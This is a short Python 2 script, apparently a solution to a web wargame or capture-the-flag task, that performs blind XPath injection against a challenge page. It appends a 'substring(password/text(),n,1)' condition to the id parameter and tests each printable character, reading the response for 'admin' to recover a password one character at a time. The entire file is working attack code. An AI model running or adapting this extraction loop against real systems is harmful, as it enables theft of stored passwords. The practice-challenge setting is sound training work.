'''
Created on 2016-7-1
@author: wenhuizone
'''
import requests,string

target_url='http://www.loudong.org/tasks/web23.php'
list=string.printable.strip()
s=requests.Session()
flag=''


for n in range(1,60):
    for i in list:
        x="?item=user&id=3 and substring(password/text(),%s,1)='%s'" %(n,i)
        url=target_url+x
        r=s.get(url)
        #print url
        #print r
        if "admin" in r.text:
            flag+=i
            print "flag is:%s" %flag
            break
            
        
    